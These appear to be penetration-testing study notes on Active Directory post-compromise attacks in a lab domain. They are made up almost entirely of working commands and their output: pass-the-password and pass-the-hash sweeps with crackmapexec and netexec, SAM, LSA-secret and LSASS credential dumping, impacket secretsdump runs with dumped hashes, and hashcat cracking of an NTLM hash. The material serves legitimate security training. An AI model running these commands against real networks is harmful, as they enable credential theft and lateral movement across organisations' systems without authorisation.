# AD - Post-Compromise Attacks

## Pass the Hash

### crackmapexec

> 📌 Some commands could not be working since CrackMapExec is no longer mantained -> Jump to [NetExec](#netexec) for working commands

➡️ [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec) - post-exploitation tool that helps automate assessing the security of large Active Directory networks

- [CrackMapExec Cheat Sheet 2024 (Commands & Examples) - Stationx](https://www.stationx.net/crackmapexec-cheat-sheet/)

**Pass the Password**

```bash
crackmapexec smb 192.168.31.0/24 -u fcastle -d MARVEL.local -p Password1
```

![Pass the Password](.gitbook/assets/2024-08-16_09-18-13_685.png)

**Pass the Hash**

- Use the `administrator` user's hash from the SAM dump

```bash
# NTLMv1 necessary
crackmapexec smb 192.168.31.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth
```

![Pass the Hash](.gitbook/assets/2024-08-16_09-21-21_686.png)

```bash
# Dump the SAM
crackmapexec smb 192.168.31.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --sam

# Enumerate shares (not connected to)
crackmapexec smb 192.168.31.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --shares

# Dump LSA secrets
crackmapexec smb 192.168.31.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --lsa
```

![](.gitbook/assets/2024-08-16_09-26-19_687.png)

```bash
# Use modules
crackmapexec smb -L

crackmapexec smb 192.168.31.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth -M lsassy
```

```bash
# Check CME DB
cmedb

hosts
creds
export creds detailed cme_creds
```

### netexec

➡️ [netexec](https://github.com/Pennyw0rth/NetExec)

```bash
sudo apt install pipx git
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec
```

```bash
netexec smb 192.168.31.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth -M lsassy

# LSASSY 192.168.31.93 445 THEPUNISHER MARVEL\Administrator 920ae267e048417fcfe00f49ecbd4b33
```

![](.gitbook/assets/2024-08-16_09-44-46_688.png)

### secretsdump.py

➡️ [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) from `impacket`

**e.g.** of lateral movement Hash Attack

- LLMNR -> `fcastle` hash -> cracked -> sprayed the password -> new login found -> secretsdump logins -> local admin hashes -> respray the network with local accounts

```bash
# Password attack
secretsdump.py MARVEL.local/fcastle:'Password1'@spiderman.MARVEL.local
secretsdump.py MARVEL.local/fcastle:'Password1'@thepunisher.MARVEL.local

# Hash attack
secretsdump.py administrator:@spiderman.MARVEL.local -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
```

```bash
# Check for hashes and clear text passwords (e.g. wdigest)

Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
frankcastle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
peterparker:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::

[*] Dumping cached domain logon information (domain/username:hash)
MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#c7154f935b7d1ace4c1d72bd4fb7889c: (2024-07-15 21:58:30)
MARVEL.LOCAL/fcastle:$DCC2$10240#fcastle#e6f48c2526bd594441d3da3723155f6f: (2024-07-28 18:56:22)
MARVEL.LOCAL/pparker:$DCC2$10240#pparker#9f28ff35b303d014c9e85e35ab47d019: (2024-07-28 19:01:19)
```

- **e.g.** Cracking NTLMv1

```bash
echo '7facdc498ed1680c4fd1448319a8c04f' > ntlm.txt

hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt

	7facdc498ed1680c4fd1448319a8c04f:Password1!
```

---

